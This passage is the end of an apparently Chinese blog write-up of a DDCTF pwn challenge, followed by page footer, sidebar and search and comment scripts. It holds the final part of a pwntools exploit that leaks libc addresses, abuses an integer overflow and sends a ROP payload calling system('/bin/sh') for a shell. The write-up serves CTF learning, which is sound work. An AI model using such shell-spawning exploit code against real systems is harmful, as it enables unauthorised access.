</span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>总结：</strong></p>
+<ul>
+<li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li>
+<li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li>
+<li>如果还有什么不懂了，可以下方留言</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+    <div>
+    <div>
+      
+        
+
+      
+    </div>
+    
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/18/C-vector-reverse/" rel="next" title="C++_vector_reverse">
+                <i class="fa fa-chevron-left"></i> C++_vector_reverse
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/19/ida/" rel="prev" title="ida7.2的安装">
+                ida7.2的安装 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LiHua</p>
+              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#滴滴CTF之唯一的pwn题详解"><span class="nav-number">1.</span> <span class="nav-text">滴滴CTF之唯一的pwn题详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目简介"><span class="nav-number">1.1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位"><span class="nav-number">1.2.</span> <span class="nav-text">定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定点泄露"><span class="nav-number">1.3.</span> <span class="nav-text">定点泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">1.4.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">1.4.1.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiHua</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz',
+        appKey: 'C1z9X6NQu0ES8qiAOF8RaSq3',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KHpRP13gAjuU8mAfkHtBxcDF-gzGzoHsz", "C1z9X6NQu0ES8qiAOF8RaSq3");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
